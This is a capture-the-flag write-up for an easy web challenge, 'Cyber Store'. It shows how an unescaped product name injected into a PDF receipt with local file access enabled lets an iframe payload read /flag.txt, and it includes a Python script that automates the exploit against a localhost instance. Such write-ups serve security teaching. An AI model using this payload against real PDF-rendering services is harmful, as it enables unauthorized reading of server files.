# Web - Cyber Store
**Author** : jvvan  
**Difficulty**: <font color='lightgreen'>Easy</font>  
**Description**: Welcome to the Cyber Store - your one-stop shop for cyber security tools! Can you try ordering something?

**Flag**: ``SCC{wh0_kn3w_pdf5_c0uld_r34d_f1l35}``

# Writeup

When adding a product to the cart, we can put a custom `productName`. This name will be shown in the receipt without escaping.

When creating the PDF, `enableLocalFileAccess` is set to `true`, which allows us to read files from the server. We can create an iframe with `src="file:///flag.txt"` and then read the content of the file.

```html
<iframe src="file:///flag.txt"></iframe>
```

Downloading the receipt gives us the flag.

### Automated Script

```python
SITE_URL = "http://localhost:3000"

import requests
from PyPDF2 import PdfReader
from io import BytesIO

s = requests.Session()


def add_to_cart(id, name):
    s.post(f"{SITE_URL}/cart/add", data={"productId": id, "productName": name})
    print(f"Added {name} to cart.")


def order():
    res = s.post(
        f"{SITE_URL}/order",
        data={
            "name": "John Doe",
            "email": "john@doe.com",
            "address": "123 Main St",
        },
    )
    if res.status_code == 200:
        print("Order placed successfully.")

        order_id = res.text.split("/receipt/")[1].split('"')[0]
        print(f"Order ID: {order_id}")
        return order_id
    else:
        print("Failed to place order.")


def get_receipt(order_id):
    res = s.get(f"{SITE_URL}/receipt/{order_id}")
    if res.status_code == 200:
        print("Receipt retrieved successfully.")
        return res.content
    else:
        print("Failed to retrieve receipt.")


def extract_pdf_text(pdf_data):
    reader = PdfReader(BytesIO(pdf_data))
    text = ""
    for page in reader.pages:
        text += page.extract_text()
    return text


def main():
    add_to_cart(1, '<iframe src="file:///flag.txt"></iframe>')
    order_id = order()
    receipt = get_receipt(order_id)

    text = extract_pdf_text(receipt)
    flag = text.split("SCC{")[1].split("}")[0]
    print(f"Flag: SCC{{{flag}}}")


if __name__ == "__main__":
    main()
```